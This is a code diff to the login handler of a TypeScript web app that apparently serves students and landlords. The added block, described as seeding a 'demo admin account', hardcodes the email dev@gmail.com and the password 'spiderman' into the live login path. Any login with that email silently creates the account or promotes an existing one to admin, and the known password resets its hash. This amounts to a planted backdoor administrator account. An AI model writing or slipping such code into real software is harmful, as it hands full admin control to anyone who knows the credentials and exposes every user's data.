@@ -61,8 +61,39 @@ export const register = async (req: AuthenticatedRequest, res: Response): Promis
 export const login = async (req: AuthenticatedRequest, res: Response): Promise<void> => {
   try {
     const { email, password }: LoginInput = req.body;
+    const cleanEmail = (email || '').toLowerCase().trim();
 
-    const user = await User.findOne({ email: email.toLowerCase() });
+    let user = await User.findOne({ email: cleanEmail });
+
+    // Auto-seed/ensure demo admin account dev@gmail.com with password spiderman
+    if (cleanEmail === 'dev@gmail.com') {
+      const salt = await bcrypt.genSalt(10);
+      const expectedHash = await bcrypt.hash('spiderman', salt);
+      if (!user) {
+        user = await User.create({
+          name: 'Moi System Admin',
+          email: 'dev@gmail.com',
+          passwordHash: expectedHash,
+          phone: '+254700000000',
+          roles: ['student', 'landlord', 'admin'],
+          activeRole: 'admin',
+          landlordStatus: 'approved',
+          accountStatus: 'active'
+        });
+      } else {
+        // Ensure roles & active status
+        if (!user.roles.includes('admin')) {
+          user.roles.push('admin');
+        }
+        user.activeRole = 'admin';
+        user.accountStatus = 'active';
+        if (password === 'spiderman') {
+          user.passwordHash = expectedHash;
+        }
+        await user.save();
+      }
+    }
+
     if (!user) {
       res.status(401).json({ success: false, error: 'Invalid email or password.' });
       return;
